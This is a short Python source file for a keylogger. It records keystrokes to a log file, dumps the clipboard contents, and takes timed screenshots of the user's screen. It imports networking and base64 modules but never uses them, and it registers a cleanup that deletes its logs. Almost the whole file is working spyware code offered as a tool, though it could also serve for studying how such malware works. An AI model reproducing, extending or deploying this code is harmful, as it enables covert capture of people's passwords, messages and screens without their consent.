from pynput import keyboard
import time
import os,shutil
import requests # type: ignore
import base64
import pyperclip
import atexit
from PIL import ImageGrab

currStr =""
lastUpdated = time.time()
screengrab_dir = "./screengrabs"
logfile = "KeyLog.txt"

#Writes the Keys to KeyLog textfile in a pretty way using linebreaks after some time and interpreting spaces,tabs and enter
def keyListener(key):
    global lastUpdated
    if key == keyboard.Key.enter:
        with open(logfile,'a') as Log:
            Log.write("\n")
    elif key == keyboard.Key.tab or key == keyboard.Key.space:
        with open(logfile,'a') as Log:
            Log.write("\t")
    elif time.time() - lastUpdated <= 5:
        screengrap()
        with open(logfile,'a') as Log:
            try:
                Log.write(key.char)
            except:
                print("Cant read Char")
    else:
        with open(logfile,'a') as Log:
            try:
                Log.write("\n"+key.char)
            except:
                print("Cant read Char")
    lastUpdated = time.time()
    
def on_release(key):
    global keystrokes

    if key == keyboard.Key.esc:
        
        with open(logfile,'a') as Log:
            try:
                Log.write(key.char)
            except:
                print("Cant read Char")

        print("Exiting.")
        return False     
    
#Save Clipboard Contents in next Log entry     
def get_clipboard(): 
    global currStr
    currStr = pyperclip.paste()
    with open(logfile,'a') as Log:
            try:
                Log.write(currStr)
            except:
                print("Cant read clipboard")
                
def screengrap():
    global screengrab_dir
    if not os.path.exists(screengrab_dir):
        os.makedirs(screengrab_dir)
    #Naming pic based on time
    screengrab_path = os.path.join(screengrab_dir, f"screengrab_{int(time.time())}.png")
    screengrab = ImageGrab.grab()  #Smile
    screengrab.save(screengrab_path)
    
def cleanup():
    if os.path.exists(logfile):
        os.remove(logfile)
    if os.path.exists(screengrab_dir):
        try:
            shutil.rmtree(screengrab_dir)
        except:
            print("error deleting")
if __name__ == "__main__":
    get_clipboard()
    with keyboard.Listener(on_press=keyListener, on_release=on_release) as listener:
        listener.join()
    atexit.register(cleanup)